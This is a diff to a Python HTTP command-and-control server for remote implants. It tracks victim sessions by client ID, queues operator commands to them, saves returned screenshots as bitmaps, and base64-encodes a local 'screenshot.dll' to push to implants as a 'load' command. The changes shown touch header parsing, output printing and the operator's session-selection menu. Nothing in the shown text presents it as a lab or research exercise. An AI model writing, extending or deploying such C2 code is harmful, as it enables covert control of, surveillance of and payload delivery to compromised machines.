@@ -33,8 +33,9 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         global session_commands
         global previous_commands
         
-        clientid = self.headers.get('clientid')
-        commands = self.headers.get('Commands')
+        clientid = self.headers.get("clientid")
+        commands = self.headers.get("Commands")
+        command = self.headers.get("command")
         
         content_length = int(self.headers["Content-Length"])
         post_data = self.rfile.read(content_length)
@@ -42,12 +43,14 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         response = b""
         # Got back a response from a command
         if (received != b"none"):
-            cmd = previous_commands[clientid].get()
+            #cmd = previous_commands[clientid].get()
+            cmd = command
             print("[ {} ]".format(cmd[:256]))
-            if cmd[:10] == b"screenshot":
+            if cmd.startswith("screenshot"):
                 bmp(received)
-            for line in str(received)[2:-1].split("\\n"):
-                print(line)
+            print(str(received)[:100])
+            #for line in str(received)[2:-1].split("\\n"):
+            #    print(line)
 
         if clientid:
             if clientid not in sessions:
@@ -106,25 +109,25 @@ def user_interface():
                 if "LOADTEST" in command:
                     with open("screenshot.dll", "rb") as f:
                         data = f.read()
-                    command = b"load " + base64.b64encode(data)
+                    command = "load " + base64.b64encode(data).decode()
                 session_queues[selected_session].put(command)
                 previous_commands[selected_session].put(command)
                 print(f'Queued data for session {selected_session}.')
         else:
-            print("Current sessions:", list(sessions.keys()))
-            command = input("Enter 'select <clientid>' to select a session or 'exit' to exit: ")
+            print("Current sessions:", sessions.keys())
+            print("Commands available:")
+            print("  select <clientid>")
+            print("  exit")
+            command = input("[]> ")
             
             if command.startswith('select '):
                 clientid = command.split(' ')[1]
                 if clientid in sessions:
                     selected_session = clientid
                 else:
-                    print(f'Session {clientid} does not exist.')
-                    
+                    print(f'[!] Session {clientid} does not exist.')
             elif command == 'exit':
                 break
-            else:
-                print('Invalid command.')
 
 if __name__ == "__main__":
     server_thread = threading.Thread(target=run_server)
